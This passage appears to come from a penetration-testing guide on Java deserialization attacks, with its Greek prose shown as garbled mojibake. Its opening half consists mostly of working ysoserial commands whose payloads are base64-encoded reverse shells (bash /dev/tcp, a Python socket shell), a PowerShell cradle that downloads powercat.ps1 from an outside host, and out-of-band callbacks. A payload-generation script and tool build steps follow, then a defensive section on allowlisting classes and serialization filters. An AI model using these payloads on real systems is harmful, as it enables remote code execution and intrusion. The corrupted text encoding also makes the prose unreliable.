# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
ÎŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Îµ Î­Î½Î± payload Î³Î¹Î± **java.lang.Runtime.exec()** Î´ÎµÎ½ **Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎµÎ¹Î´Î¹ÎºÎ¿ÏÏ‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚** ÏŒÏ€Ï‰Ï‚ ">" Î® "|" Î³Î¹Î± Î½Î± Î±Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÏ„Îµ Ï„Î·Î½ Î­Î¾Î¿Î´Î¿ Î¼Î¹Î±Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚, "$()" Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î® Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ **Î½Î± Ï€ÎµÏÎ¬ÏƒÎµÏ„Îµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚** ÏƒÎµ Î¼Î¹Î± ÎµÎ½Ï„Î¿Î»Î® Ï‡Ï‰ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¼Îµ **ÎºÎµÎ½Î¬** (Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ `echo -n "hello world"` Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ `python2 -c 'print "Hello world"'`). Î“Î¹Î± Î½Î± ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏƒÏ‰ÏƒÏ„Î¬ Ï„Î¿ payload Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± [Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î±](http://www.jackson-t.ca/runtime-exec-payloads.html).

ÎœÎ· Î´Î¹ÏƒÏ„Î¬ÏƒÎµÏ„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ **ÏŒÎ»Î± Ï„Î± Ï€Î¹Î¸Î±Î½Î¬ payloads ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ±** Î³Î¹Î± Windows ÎºÎ±Î¹ Linux ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï„Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ ÏƒÏ„Î· ÎµÏ…Î¬Î»Ï‰Ï„Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **Î¼Î±Î¶Î¯ Î¼Îµ Ï„Î¿ ysoserial Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿Ï…Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚**. Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÏƒÏ„Î¹Ï‚ **Î´Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚ Ï„Î·Ï‚ Î¿Î¼Î¹Î»Î¯Î±Ï‚** ÏŒÏ€Î¿Ï… Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬ÏƒÏ„Î·ÎºÎµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ payloads Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ **Json** ÎºÎ±Î¹ **Yml** Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Java.\
Î“Î¹Î± Î½Î± ÎºÎ¬Î½Ï‰ compile Ï„Î¿ Î­ÏÎ³Î¿, Ï‡ÏÎµÎ¹Î¬ÏƒÏ„Î·ÎºÎµ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ‰** Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ **ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚** ÏƒÏ„Î¿ `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Î•Î³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î¿ maven**, ÎºÎ±Î¹ **ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÏ„Îµ** Ï„Î¿ Î­ÏÎ³Î¿:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î¼ÎµÏÎ¹ÎºÎ¬ ysoserial payloads Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï„ÏÎ­Î¾ÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î¹ÏƒÏ„Î¿Ï**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Î— Java Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï€Î¿Î»Ï serialization Î³Î¹Î± Î´Î¹Î¬Ï†Î¿ÏÎ¿Ï…Ï‚ ÏƒÎºÎ¿Ï€Î¿ÏÏ‚ ÏŒÏ€Ï‰Ï‚:

* **HTTP requests**: Î— serialization Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎµÏ…ÏÎ­Ï‰Ï‚ ÏƒÏ„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½, ViewState, cookies, Îº.Î»Ï€.
* **RMI (Remote Method Invocation)**: Î¤Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Java RMI, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î²Î±ÏƒÎ¯Î¶ÎµÏ„Î±Î¹ ÎµÎ¾ Î¿Î»Î¿ÎºÎ»Î®ÏÎ¿Ï… ÏƒÏ„Î· serialization, ÎµÎ¯Î½Î±Î¹ Î¸ÎµÎ¼Î­Î»Î¹Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Java.
* **RMI over HTTP**: Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€ÏŒ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î¹ÏƒÏ„Î¿Ï Java Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ thick client, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ serialization Î³Î¹Î± ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯ÎµÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½.
* **JMX (Java Management Extensions)**: Î¤Î¿ JMX Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ serialization Î³Î¹Î± Ï„Î· Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï….
* **Custom Protocols**: Î£Ï„Î·Î½ Java, Î· Ï„Ï…Ï€Î¹ÎºÎ® Ï€ÏÎ±ÎºÏ„Î¹ÎºÎ® Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· Î±ÎºÎ±Ï„Î­ÏÎ³Î±ÏƒÏ„Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ Java, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… Î¸Î± Î±Ï€Î¿Î´ÎµÎ¹Ï‡Î¸ÎµÎ¯ ÏƒÎµ ÎµÏ€ÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚.

### Prevention

#### Transient objects

ÎœÎ¹Î± ÎºÎ»Î¬ÏƒÎ· Ï€Î¿Ï… Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ `Serializable` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï‰Ï‚ `transient` Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ· Ï€Î¿Ï… Î´ÎµÎ½ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ serializable. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Î‘Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Ï„Î·Î½ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î¹Î±Ï‚ ÎºÎ»Î¬ÏƒÎ·Ï‚ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ Serializable

Î£Îµ ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏŒÏ€Î¿Ï… Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î· Î´Î¹ÎµÏ€Î±Ï†Î® `Serializable`** Î»ÏŒÎ³Ï‰ Î¹ÎµÏÎ±ÏÏ‡Î¯Î±Ï‚ ÎºÎ»Î¬ÏƒÎµÏ‰Î½, Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ¯Î½Î´Ï…Î½Î¿Ï‚ Î±ÎºÎ¿ÏÏƒÎ¹Î±Ï‚ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. Î“Î¹Î± Î½Î± Ï„Î¿ Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„Î¬ Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± ÎµÎ¯Î½Î±Î¹ Î¼Î· Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼Î± Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± `final` `readObject()` Î¼Î­Î¸Î¿Î´Î¿ Ï€Î¿Ï… ÏÎ¯Ï‡Î½ÎµÎ¹ Ï€Î¬Î½Ï„Î± Î¼Î¹Î± ÎµÎ¾Î±Î¯ÏÎµÏƒÎ·, ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Î•Î½Î¯ÏƒÏ‡Ï…ÏƒÎ· Ï„Î·Ï‚ Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Î‘Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Java**

**Î— Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿Î³Î® Ï„Î¿Ï… `java.io.ObjectInputStream`** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï€ÏÎ±ÎºÏ„Î¹ÎºÎ® Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Î³Î¹Î± Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»Î¹ÏƒÎ· Ï„Ï‰Î½ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚. Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÏŒÏ„Î±Î½:

* ÎŸ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡ÏŒ ÏƒÎ±Ï‚.
* ÎŸÎ¹ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î±Î½Î±Î¼Î­Î½Î¿Î½Ï„Î±Î¹ Î³Î¹Î± Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„Î­Ï‚.

Î‘Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ **`resolveClass()`** Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· Î¼ÏŒÎ½Î¿ ÏƒÎµ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚. Î‘Ï…Ï„ÏŒ Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· Î¿Ï€Î¿Î¹Î±ÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎºÎ»Î¬ÏƒÎ·Ï‚ ÎµÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Î¹ ÏÎ·Ï„Î¬, ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· Î¼ÏŒÎ½Î¿ ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ· `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Java Agent Î³Î¹Î± Ï„Î·Î½ Î•Î½Î¯ÏƒÏ‡Ï…ÏƒÎ· Ï„Î·Ï‚ Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚** Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î»ÏÏƒÎ· ÏŒÏ„Î±Î½ Î· Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î®. Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÏ„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Î³Î¹Î± **Î¼Î±ÏÏÎ· Î»Î¯ÏƒÏ„Î± ÎµÏ€Î¹Î²Î»Î±Î²ÏÎ½ ÎºÎ»Î¬ÏƒÎµÏ‰Î½**, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ JVM:
```
-javaagent:name-of-agent.jar
```
Î Î±ÏÎ­Ï‡ÎµÎ¹ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î³Î¹Î± Î½Î± Î±ÏƒÏ†Î±Î»Î¯ÏƒÎµÏ„Îµ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¬, Î¹Î´Î±Î½Î¹ÎºÏŒ Î³Î¹Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± ÏŒÏ€Î¿Ï… Î¿Î¹ Î¬Î¼ÎµÏƒÎµÏ‚ Î±Î»Î»Î±Î³Î­Ï‚ ÎºÏÎ´Î¹ÎºÎ± ÎµÎ¯Î½Î±Î¹ Î¼Î· Ï€ÏÎ±ÎºÏ„Î¹ÎºÎ­Ï‚.

Î”ÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏƒÏ„Î¿ [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Î•Ï†Î±ÏÎ¼Î¿Î³Î® Î¦Î¯Î»Ï„ÏÏ‰Î½ Î£ÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚**: Î— Java 9 ÎµÎ¹ÏƒÎ®Î³Î±Î³Îµ Ï†Î¯Î»Ï„ÏÎ± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Î´Î¹ÎµÏ€Î±Ï†Î®Ï‚ **`ObjectInputFilter`**, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Î½Î±Î½ Î¹ÏƒÏ‡Ï…ÏÏŒ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ Î³Î¹Î± Ï„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼ÏŒ ÎºÏÎ¹Ï„Î·ÏÎ¯Ï‰Î½ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î»Î·ÏÎ¿ÏÎ½ Ï„Î± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï€ÏÎ¹Î½ Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¹ÎµÏƒÏ„Î¿ÏÎ½. Î‘Ï…Ï„Î¬ Ï„Î± Ï†Î¯Î»Ï„ÏÎ± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ†Î±ÏÎ¼Î¿ÏƒÏ„Î¿ÏÎ½ Ï€Î±Î³ÎºÎ¿ÏƒÎ¼Î¯Ï‰Ï‚ Î® Î±Î½Î¬ ÏÎ¿Î®, Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎ® Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚.

